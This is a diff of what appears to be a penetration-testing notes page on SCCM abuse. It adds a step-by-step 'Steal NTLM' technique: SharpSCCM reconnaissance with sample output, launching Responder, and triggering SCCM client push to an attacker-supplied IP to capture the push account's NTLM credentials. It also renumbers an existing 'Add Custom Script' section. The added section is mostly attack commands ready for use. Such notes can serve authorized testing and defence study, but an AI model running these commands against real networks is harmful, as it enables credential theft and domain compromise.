@@ -1,6 +1,5 @@
 ---
 title: "SCCM"
-date: 2024-11-9
 tags: ["SCCM", "System Center Configuration Manager", "Active Directory", "Windows", "Configuration Management"]
 ---
 
@@ -140,7 +139,50 @@ PSComputerName                 : SCCM
 
 ---
 
-### Abuse #1: Add Custom Script
+### Abuse #1: Steal NTLM
+
+{{< tab set2 tab1 >}}Windows{{< /tab >}}
+{{< tabcontent set2 tab1 >}}
+
+#### 1. Check
+
+```console
+.\sharpsccm.exe local site-info
+```
+
+```console {class="sample-code"}
+  _______ _     _ _______  ______  _____  _______ _______ _______ _______
+  |______ |_____| |_____| |_____/ |_____] |______ |       |       |  |  |
+  ______| |     | |     | |    \_ |       ______| |______ |______ |  |  |    @_Mayyhem 
+
+[+] Connecting to \\127.0.0.1\root\CCM
+[+] Executing WQL query: SELECT Name,CurrentManagementPoint FROM SMS_Authority  
+-----------------------------------
+SMS_Authority
+-----------------------------------
+CurrentManagementPoint: DC01.example.com
+Name: SMS:HQ0
+-----------------------------------
+[+] Completed execution in 00:00:00.2573919
+```
+
+#### 2. Start Responder
+
+```console
+sudo responder -I tun0
+```
+
+#### 3. Register a New Device
+
+```console
+.\sharpsccm.exe invoke client-push -t <LOCAL_IP>
+```
+
+{{< /tabcontent >}}
+
+---
+
+### Abuse #2: Add Custom Script
 
 #### 1. Import Module
 
